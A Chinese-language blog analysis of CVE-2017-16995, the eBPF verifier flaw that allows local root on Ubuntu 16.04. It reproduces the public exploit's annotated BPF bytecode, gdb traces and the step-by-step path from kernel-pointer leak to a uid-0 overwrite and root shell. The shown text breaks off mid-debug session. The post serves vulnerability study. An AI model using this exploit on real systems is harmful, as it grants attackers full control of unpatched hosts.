# 【原创】深入分析 Ubuntu 本地提权漏洞 CVE-2017-16995 - rebeyond - 博客园

> 原文：[`www.cnblogs.com/rebeyond/p/8921307.html`](https://www.cnblogs.com/rebeyond/p/8921307.html)

#### *本文首发阿里云先知安全技术社区，原文链接 https://xz.aliyun.com/t/2212

## 前言：

2018 年 3 月中旬，Twitter 用户 @Vitaly Nikolenko 发布消息，称 ubuntu 最新版本（Ubuntu 16.04）存在高危的本地提权漏洞，而且推文中还附上了 EXP 下载地址。

![](img/66db11161e8fbf8dc8c6e14a14988375.png)

由于该漏洞成功在 aws Ubuntu 镜像上复现，被认为是 0DAY，引起了安全圈同学们的广泛关注。大体浏览了 一下 exp 代码，发现利用姿势很优雅，没有 ROP，没有堆，没有栈，比较感兴趣，不过等了几天也没发现有详细的漏洞分析，正好赶上周末，便自己跟了一下：）

经过一番了解发现这个漏洞并不是什么 0DAY，最早是去年 12 月 21 号 Google Project Zero 团队的 Jann Horn 发现并报告的，编号为 CVE-2017-16995，作者在报告该漏洞的时候附了一个 DOS 的 POC。另外，最早公开发布可成功提权 exploit 也不是 Vitaly Nikolenko，而是[Bruce Leidl](https://twitter.com/bleidl)，其在 12 月 21 号就把完整的提权 exploit 公布到了 github 上，地址：[`github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c`](https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c)。

## 技术分析

**eBPF****简介**

众所周知，linux 的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能 root 用户才能加载。而 BPF 则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用 eBPF 指令字节码的形式向内核输送代码，并通过事件（如往 socket 写数据）来触发内核执行用户提供的代码；同时以 map（key，value）的形式来和内核共享数据，用户层向 map 中写数据，内核层从 map 中取数据，反之亦然。BPF 设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核 probe、性能监控等领域。BPF 发展经历了 2 个阶段，cBPF（classic BPF）和 eBPF（extend BPF），cBPF 已退出历史舞台，后文提到的 BPF 默认为 eBPF。

**eBPF****虚拟指令系统**

eBPF 虚拟指令系统属于 RISC，拥有 10 个虚拟寄存器，r0-r10，在实际运行时，虚拟机会把这 10 个寄存器一一对应于硬件 CPU 的 10 个物理寄存器，以 x64 为例，对应关系如下：

```
    R0 – rax
```

```
    R1 - rdi
```

```
    R2 - rsi
```

```
    R3 - rdx
```

```
    R4 - rcx
```

```
    R5 - r8
```

```
    R6 - rbx
```

```
    R7 - r13
```

```
    R8 - r14
```

```
    R9 - r15
```

```
    R10 – rbp（帧指针，frame pointer）
```

```
每一条指令的格式如下：
```

```
struct bpf_insn {
    __u8    code; /* opcode */ __u8    dst_reg:4;    /* dest register */ __u8    src_reg:4;    /* source register */ __s16    off; /* signed offset */ __s32    imm; /* signed immediate constant */ };
```

```
如一条简单的 x86 赋值指令：mov eax,0xffffffff,对应的 BPF 指令为：BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)，其对应的数据结构为：
```

```
#define BPF_MOV32_IMM(DST, IMM)                    \ ((struct bpf_insn) {                    \
        .code = BPF_ALU | BPF_MOV | BPF_K,        \
        .dst_reg = DST,                    \
        .src_reg = 0,                    \
        .off = 0,                    \
        .imm = IMM })
```

```
其在内存中的值为：\xb4\x09\x00\x00\xff\xff\xff\xff。
```

```
关于 BPF 指令系统此处就不再赘述，只要明确以下两点即可：1.其为 RISC 指令系统，也就是说每条指令大小都是一样的；2.其虚拟的 10 个寄存器一一对应于物理 cpu 的寄存器，且功能类似，比如 BPF 的 r10 寄存器和 rbp 一样指向栈，r0 用于返回值。
```

**BPF****的加载过程**

```
一个典型的 BPF 程序流程为：
```

```
1.   用户程序调用 syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr))申请创建一个 map，在 attr 结构体中指定 map 的类型、大小、最大容量等属性。
```

```
2.   用户程序调用 syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr))来将我们写的 BPF 代码加载进内核，attr 结构体中包含了指令数量、指令首地址指针、日志级别等属性。在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对 BPF 程序 stack 之外的内核地址读写。安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。
```

```
3.   用户程序通过调用 setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)将我们写的 BPF 程序绑定到指定的 socket 上。Progfd 为上一步骤的返回值。
```

```
4.   用户程序通过操作上一步骤中的 socket 来触发 BPF 真正执行。
```

**BPF****的安全校验**

```
Bpf 指令的校验是在函数 do_check 中，代码路径为 kernel/bpf/verifier.c。do_check 通过一个无限循环来遍历我们提供的 bpf 指令，
```

```
理论上虚拟执行和真实执行的执行路径应该是完全一致的。如果步骤 2 安全校验过程中的虚拟执行路径和步骤 4 bpf 的真实执行路径不完全一致的话，会怎么样呢？看下面的例子：
```

```
*1.BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */

2.BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) {        */

3.BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */

4.BPF_EXIT_INSN()*
```

```
*5.……*
```

```
第一条指令是个简单的赋值语句，把 0xFFFFFFFF 这个值赋值给 r9.
```

```
第二条指令是个条件跳转指令，如果 r9 等于 0xFFFFFFFF，则退出程序，终止执行；如果 r9 不等于 0xFFFFFFFF，则跳过后面 2 条执行继续执行第 5 条指令。
```

```
虚拟执行的时候，do_check 检测到第 2 条指令等式恒成立，所以认为 BPF_JNE 的跳转永远不会发生，第 4 条指令之后的指令永远不会执行，所以检测结束，do_check 返回成功。
```

```
真实执行的时候，由于一个符号扩展的 bug，导致第 2 条指令中的等式不成立，于是 cpu 就跳转到第 5 条指令继续执行，这里是漏洞产生的根因，这 4 条指令，可以绕过 BPF 的代码安全检查。既然安全检查被绕过了，用户就可以随意往内核中注入代码了，提权就水到渠成了：先获取到 task_struct 的地址，然后定位到 cred 的地址，然后定位到 uid 的地址，然后直接将 uid 的值改为 0，然后启动/bin/bash。
```

## **漏洞分析**

```
下面结合真实的 exp 来动态分析一下漏洞的执行过程。
```

```
Vitaly Nikolenko 公布的这个 exp，关键代码就是如下这个 prog 数组：
```

![](img/4a4a33ed2a03beb7054f57b465f62e81.png)

```
这个数组就是 BPF 的指令数据，想要搞清楚 exp 的机理，首先要把这堆 16 进制数据翻译成 BPF 指令，翻译结果如下：
```

```
bytes="\xb4\x09\x00\x00\xff\xff\xff\xff"\  #BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */
"\x55\x09\x02\x00\xff\xff\xff\xff"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) {        */
"\xb7\x00\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN()

"\x18\x19\x00\x00\x03\x00\x00\x00"\  # BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */
"\x00\x00\x00\x00\x00\x00\x00\x00"\ #BPF_MAP_GET(0, BPF_REG_6)  r6=op，取 map 的第 1 个元素放到 r6
"\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
"\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
"\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
"\x62\x0a\xfc\xff\x00\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = idx */
"\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
"\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
"\x79\x06\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */

#BPF_MAP_GET(1, BPF_REG_7)  r7=address，取 map 的第 2 个元素放到 r7
"\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
"\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
"\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
"\x62\x0a\xfc\xff\x01\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = idx */
"\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
"\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
"\x79\x07\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */

#BPF_MAP_GET(2, BPF_REG_8)  r8=value，取 map 的第 3 个元素放到 r8
"\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
"\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
"\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
"\x62\x0a\xfc\xff\x02\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = idx */
"\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
"\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
"\x79\x08\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */

"\xbf\x02\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0               */
"\xb7\x00\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */
"\x55\x06\x03\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */
"\x79\x73\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),
"\x7b\x32\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),
"\x55\x06\x02\x00\x01\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),
"\x7b\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
"\x7b\x87\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
```

```
在 do_check 上打个断点，编译运行，成功断了下来，先看一下调用栈：
```

```
(gdb) bt
#0  do_check (env=0xffff880078190000)
    at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/verifier.c:1724 #1  0xffffffff8117c057 in bpf_check (prog=0xffff880034003e10, 
    attr=<optimized out>)
    at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/verifier.c:2240 #2  0xffffffff81178631 in bpf_prog_load (attr=0xffff880034003ee0)
    at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/syscall.c:679 #3  0xffffffff81178d3a in SYSC_bpf (size=48, uattr=<optimized out>, 
    cmd=<optimized out>)
    at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/syscall.c:783 #4  SyS_bpf (cmd=5, uattr=140722476394128, size=48)
    at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/syscall.c:725 #5  0xffffffff8184efc8 in entry_SYSCALL_64 ()
    at /build/linux-fQ94TU/linux-4.4.0/arch/x86/entry/entry_64.S:193 #6  0x0000000000000001 in irq_stack_union ()
#7  0x0000000000000000 in ?? ()
(gdb)
```

```
首先看第一条赋值语句 BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)，do_check 中最终的赋值语句如下：
![](img/eef658d9beb3901f8074623a3a21fd7f.png)
```

```
其中 dst_reg 为虚拟执行过程中的寄存器结构体，结构体定义如下：
```

```
![](img/b798e877321cf39109514f37c92c9b4b.png)
```

```
可以看到该结构体有 2 个字段，第一个为 type，代表寄存器数据的类型，此处为 CONST_IMM，CONST_IMM 的值为 8.另外一个为常量立即数的具体数值，可以看到类型为 int 有符号整形。
```

```
我们在此处下断点，可以看到具体的赋值过程，如下:
```

```
(gdb) x/10 $rip-4
   0xffffffff8117b0ac <do_check+5548>:   mov    DWORD PTR [rsi+rax*1+0x8],edx => 0xffffffff8117b0b0 <do_check+5552>:   
    jmp 0xffffffff8117a38c <do_check+2188>
   0xffffffff8117b0b5 <do_check+5557>:   mov    rdi,QWORD PTR [rsp+0x38] 0xffffffff8117b0ba <do_check+5562>:   mov    rdx,rax 0xffffffff8117b0bd <do_check+5565>:   movzx  esi,al 0xffffffff8117b0c0 <do_check+5568>:   and    edx,0x18
   0xffffffff8117b0c3 <do_check+5571>:   mov    rdx,QWORD PTR [rdx-0x7e5db140] 0xffffffff8117b0ca <do_check+5578>:   movzx  ecx,BYTE PTR [rdi+0x1] 0xffffffff8117b0ce <do_check+5582>:   movsx  r8d,WORD PTR [rdi+0x2] 0xffffffff8117b0d3 <do_check+5587>:   mov    r9d,DWORD PTR [rdi+0x4]
(gdb) i r $edx
edx 0xffffffff      -1 (gdb) x/10x $rsi+$rax 0xffff8800781930a8: 0x00000008 0x00000000 0xffffffff 0x00000000
0xffff8800781930b8: 0x00000006 0x00000000 0x00000000 0x00000000
0xffff8800781930c8: 0x00000000 0x00000000 (gdb)
```

```
$rsi+$rax 处即为 reg_state 结构体，可以看到第一个字段为 8，第二个字段为 0Xffffffff。
```

```
然后我们跟进第二条指令中的比较语句 BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)，do_check 检测到跳转类指令时，根据跳转类型进入不通的检测分支，此处是 JNE 跳转，进入 check_cond_jmp_op 分支，如下图:
![](img/345b10e59ada11cda9a2086dee394020.png)
```

```
Do_check 在校验条件类跳转指令的时候，会判断条件是否成立，如果是非确定性跳转的话，就说明接下来 2 个分支都有可能执行（分支 A 和分支 B），这时 do_check 会把下一步需要跳转到的指令编号（分支 B）放到一个临时栈中备用，这样当前指令顺序校验（分支 A）过程中遇到 EXIT 指令时，会从临时栈中取出之前保存的下一条指令的序号（分支 B）继续校验。如果跳转指令恒成立的话，就不会再往临时栈中放入分支 B，因为分支 B 永远不会执行，如下图：
```

```
![](img/fecd3e8d61cf794b08cc63a4a5f51dfe.png)
```

第一个红框即为虚拟寄存器中的 imm 与指令中提供的 imm 进行比较，这两个类型如下：

![](img/5287c0f276fa330eee44906074d725a1.png)

![](img/366696144631a44641c4b0450dfd1cd9.png)

```
可以看到等号两侧的数据类型完全一致，都为有符号整数，所以此处条件跳转条件恒成立，不会往临时栈中 push 分支 B 指令编号。
```

```
接下来看 BPF_EXIT_INSN()，刚才提到在校验 EXIT 指令时，会从临时栈中尝试取指令（调用 pop_stack 函数），如果临时栈中有指令，那就说明还有其他可能执行到的分支，需要继续校验，如果取不到值，表示当前这条 EXIT 指令确实是 BPF 程序最后一条可以执行到的指令，此时 pop_stack 会返回-1，然后 break 跳出 do_check 校验循环，do_check 执行结束，校验通过，如下图：
![](img/39032c7fbc0f393540c9ebda861d93e4.png)
```

```
跟进 pop_stack，如下图：
```

```
![](img/8fe21481dac691a097e13ab14592debe.png)
```

```
实际执行过程如下：
```

```
(gdb) x/10i $rip => 0xffffffff81178f29 <pop_stack+9>:     test   r8,r8  //此处判断 env->head 是否为 NULL
   0xffffffff81178f2c <pop_stack+12>:    
    je 0xffffffff81178fb4 <pop_stack+148> //为 NULL 时，跳转到 0xffffffff81178fb4
   0xffffffff81178f32 <pop_stack+18>:    push   rbp 0xffffffff81178f33 <pop_stack+19>:    mov    rax,rsi 0xffffffff81178f36 <pop_stack+22>:    lea    rcx,[rdi+0x18] 0xffffffff81178f3a <pop_stack+26>:    mov    rdx,rdi 0xffffffff81178f3d <pop_stack+29>:    lea    rdi,[rdi+0x20] 0xffffffff81178f41 <pop_stack+33>:    mov    rbp,rsp 0xffffffff81178f44 <pop_stack+36>:    push   r13 0xffffffff81178f46 <pop_stack+38>:    push   r12
(gdb) i r $r8
r8 0x0  0 (gdb) x/10i 0xffffffff81178fb4
   0xffffffff81178fb4 <pop_stack+148>:   mov    eax,0xffffffff  //pop_stack 返回-1
   0xffffffff81178fb9 <pop_stack+153>:   ret     //pop_stack 返回-1
   0xffffffff81178fba:         nop    WORD PTR [rax+rax*1+0x0] 0xffffffff81178fc0 <verbose>:         nop    DWORD PTR [rax+rax*1+0x0] 0xffffffff81178fc5 <verbose+5>:       push   rbp 0xffffffff81178fc6 <verbose+6>:       mov    rbp,rsp 0xffffffff81178fc9 <verbose+9>:       sub    rsp,0x50
   0xffffffff81178fcd <verbose+13>:      mov    rax,QWORD PTR gs:0x28
   0xffffffff81178fd6 <verbose+22>:      mov    QWORD PTR [rsp+0x18],rax 0xffffffff81178fdb <verbose+27>:      xor    eax,eax
(gdb)
```

```
到此为止我们了解了 BPF 的校验过程，这个 exp 一共有 41 条指令，BPF 只校验了 4 条指令，然后返回校验成功。
```

```
接下来我们继续跟进 BPF 指令的执行过程，对应的代码如下（路径为 kernel/bpf/core.c）：
![](img/6a12351b0c4239dcea360d9d1007ad2f.png)
```

```
其中 DST 为目标寄存器，IMM 为立即数，我们跟进 DST 的定义：
```

```
![](img/ce365b581a6084cc9b547e2a76cbcb52.png)
```

![](img/129181e9e8b58769b2f97db7770069d9.png)

```
跟进 IMM 的定义：

```

![](img/acd01ff3008e668280e112aa16b289f2.png)

![](img/52bf88fed86c325f709d7c59f1c84e67.png)

```
很明显，等号两边的数据类型是不一致的，所以导致这里的条件跳转语句的结果完全相反，以下为实际执行过程：
```

```
(gdb) x/10i $rip => 0xffffffff8117731f <__bpf_prog_run+2191>:       
    cmp    QWORD PTR [rbp+rax*8-0x270],rdx 0xffffffff81177327 <__bpf_prog_run+2199>:       
    je 0xffffffff81177d8a <__bpf_prog_run+4858>
   0xffffffff8117732d <__bpf_prog_run+2205>:       movsx  rax,WORD PTR [rbx+0x2] 0xffffffff81177332 <__bpf_prog_run+2210>:       lea    rbx,[rbx+rax*8+0x8] 0xffffffff81177337 <__bpf_prog_run+2215>:       
    jmp 0xffffffff81176ae0 <__bpf_prog_run+80>
   0xffffffff8117733c <__bpf_prog_run+2220>:       movzx  eax,BYTE PTR [rbx+0x1] 0xffffffff81177340 <__bpf_prog_run+2224>:       mov    edx,eax 0xffffffff81177342 <__bpf_prog_run+2226>:       shr    dl,0x4
   0xffffffff81177345 <__bpf_prog_run+2229>:       and    edx,0xf
   0xffffffff81177348 <__bpf_prog_run+2232>:       
    cmp    QWORD PTR [rbp+rdx*8-0x270],0x0 (gdb) i r $rdx
rdx 0xffffffffffffffff        -1 (gdb) x/10x (rbp+rax*8-0x270)
No symbol "rbp" in current context.
(gdb) x/10x ($rbp+$rax*8-0x270) 0xffff880076143a78: 0xffffffff 0x00000000 0x76143c88 0xffff8800
0xffff880076143a88: 0x00000001 0x00000000 0x00000001 0x01000000
0xffff880076143a98: 0x746ee000 0xffff8800 (gdb) 
```

```
等号两边的值完全不一样，这里的跳转条件成立，会往后跳 2 条指令继续执行，和虚拟执行的过程相反。
```

```
接下来就是分析 exp 里面的 BPF 指令了，通过自定义 BPF 指令，我们可以绕过安全校验实现任意内核指针泄露，任意内核地址读写。
```

```
构造一下攻击路径：
```

```
1.申请一个 MAP，长度为 3；
```

```
2.这个 MAP 的第一个元素为操作指令，第 2 个元素为需要读写的内存地址，第 3 个元素用来存放读取到的内容。此时这个 MAP 相当于一个 CC，3 个元素组成一个控制指令。
```

```
3.组装一个指令，读取内核的栈地址。根据内核栈地址获取到 current 的地址。
```

```
4.读 current 结构体的第一个成员，或得 task_struct 的地址，继而加上 cred 的偏移得到 cred 地址，最终获取到 uid 的地址。
```

```
5.组装一个写指令，向上一步获取到的 uid 地址写入 0.
```

```
6.启动新的 bash 进程，该进程的 uid 为 0，提权成功。
```

```
Exp 中就是按照如上的攻击路径来提权的，申请完 map 之后，首先发送获取内核栈地址的指令，如下：
```

```
bpf_update_elem(0, 0); 
```

```
bpf_update_elem(1, 0); 
```

```
bpf_update_elem(2, 0); 
```

```
然后通过调用 writemsg 触发 BPF 程序运行，BPF 会进入如下分支：
```

```
"\x18\x19\x00\x00\x03\x00\x00\x00"\  # BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */ #BPF_MAP_GET(0, BPF_REG_6)  r6=op
"\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
"\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
"\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
"\x62\x0a\xfc\xff\x00\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = idx */
"\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
"\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
"\x79\x06\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */
```

```
之前提到过，BPF 的 r10 寄存器相当于 x86_64 的 rbp，是指向内核栈的，所以这里第一行指令将 map 的标识放到 r9，第二条指令将 r9 放到 r1，作为后续调用 BPF_FUNC_map_lookup_elem 函数的第一个参数，第三条指令将内核栈指针赋值给 r2，第四条指令在栈上开辟 4 个字节的空间，第五条指令将 map 元素的序号放到 r2，第六条指令取 map 中第 r2 个元素的值并把返回值存入 r0，第七条指令判断 BPF_FUNC_map_lookup_elem 有没有执行成功，r0=0 则未成功。成功后执行第 9 条指令，将取到的值放到 r6 中。继续依次往下执行，直到执行到下面的路径：
```

```
"\x55\x06\x03\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */
"\x79\x73\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),
"\x7b\x32\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),
"\x55\x06\x02\x00\x01\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),
"\x7b\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
"\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
```

```
判断 r6 是否为 0，为 0 说明是取栈地址的指令，这时会往下跳 3 条指令，继续执行第 7 条指令，将 r10 的内容写入 r2，由于在执行第 30 条指令时 r0 指向 map 中的第二个元素，所以这时 r2 也指向这个元素，然后用户层通过 get_value(2)取到了内核栈的地址，我们通过给 BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0)下断点，可以看到过程如下：
```

```
(gdb) x/20i 0xffffffff8117788b
   0xffffffff8117788b <__bpf_prog_run+3579>:       movzx  eax,BYTE PTR [rbx+0x1] 0xffffffff8117788f <__bpf_prog_run+3583>:       movsx  rdx,WORD PTR [rbx+0x2] 0xffffffff81177894 <__bpf_prog_run+3588>:       add    rbx,0x8
   0xffffffff81177898 <__bpf_prog_run+3592>:       mov    rcx,rax 0xffffffff8117789b <__bpf_prog_run+3595>:       shr    al,0x4
   0xffffffff8117789e <__bpf_prog_run+3598>:       and    ecx,0xf
   0xffffffff811778a1 <__bpf_prog_run+3601>:       and    eax,0xf
   0xffffffff811778a4 <__bpf_prog_run+3604>:       mov    rcx,QWORD PTR [rbp+rcx*8-0x270] 0xffffffff811778ac <__bpf_prog_run+3612>:       mov    rax,QWORD PTR [rbp+rax*8-0x270] 0xffffffff811778b4 <__bpf_prog_run+3620>:       mov    QWORD PTR [rcx+rdx*1],rax => 0xffffffff811778b8 <__bpf_prog_run+3624>:       jmp    0xffffffff81176ae0 <__bpf_prog_run+80>
   0xffffffff811778bd <__bpf_prog_run+3629>:       movzx  eax,BYTE PTR [rbx+0x1] 0xffffffff811778c1 <__bpf_prog_run+3633>:       movsx  rdx,WORD PTR [rbx+0x2] 0xffffffff811778c6 <__bpf_prog_run+3638>:       add    rbx,0x8
   0xffffffff811778ca <__bpf_prog_run+3642>:       movsxd rcx,DWORD PTR [rbx-0x4] 0xffffffff811778ce <__bpf_prog_run+3646>:       and    eax,0xf
   0xffffffff811778d1 <__bpf_prog_run+3649>:       mov    rax,QWORD PTR [rbp+rax*8-0x270] 0xffffffff811778d9 <__bpf_prog_run+3657>:       mov    QWORD PTR [rax+rdx*1],rcx 0xffffffff811778dd <__bpf_prog_run+3661>:       jmp    0xffffffff81176ae0 <__bpf_prog_run+80>
   0xffffffff811778e2 <__bpf_prog_run+3666>:       lfence 
 (gdb) i r $rax
rax 0xffff8800758c3c88        -131939423208312 (gdb) 
```

```
其中 rax 的值 0xffff8800758c3c88 即为泄露的内核栈地址（其实应该称为帧指针更准确）。
```

```
然后通过经典的 addr & ~(0x4000 - 1)获取到 current 结构体的起始地址 0xffff8800758c0000，然后构造读数据的 map 指令去读 current 中偏移为 0 的指针值（即为指向 task_struct 的指针）：
```

```
bpf_update_elem(0, 0); 
```

```
bpf_update_elem(1, 0xffff8800758c0000); 
```

```
bpf_update_elem(2, 0); 
```

```
其中 addr 为当前线程 current 的值 0xffff8800758c0000，这样可以得到 task_struct 的地址，
```

```
过程如下：
```

```
(gdb) x/10i $rip-20
   0xffffffff811778a4 <__bpf_prog_run+3604>:       mov    rcx,QWORD PTR [rbp+rcx*8-0x270] 0xffffffff811778ac <__bpf_prog_run+3612>:       mov    rax,QWORD PTR [rbp+rax*8-0x270] 0xffffffff811778b4 <__bpf_prog_run+3620>:       mov    QWORD PTR [rcx+rdx*1],rax => 0xffffffff811778b8 <__bpf_prog_run+3624>:       jmp    0xffffffff81176ae0 <__bpf_prog_run+80>
   0xffffffff811778bd <__bpf_prog_run+3629>:       movzx  eax,BYTE PTR [rbx+0x1] 0xffffffff811778c1 <__bpf_prog_run+3633>:       movsx  rdx,WORD PTR [rbx+0x2] 0xffffffff811778c6 <__bpf_prog_run+3638>:       add    rbx,0x8
   0xffffffff811778ca <__bpf_prog_run+3642>:       movsxd rcx,DWORD PTR [rbx-0x4] 0xffffffff811778ce <__bpf_prog_run+3646>:       and    eax,0xf
   0xffffffff811778d1 <__bpf_prog_run+3649>:       mov    rax,QWORD PTR [rbp+rax*8-0x270]
(gdb) i r $rax
rax 0xffff880074343c00        -131939445752832 (gdb) x/10x 0xffff8800758c0000
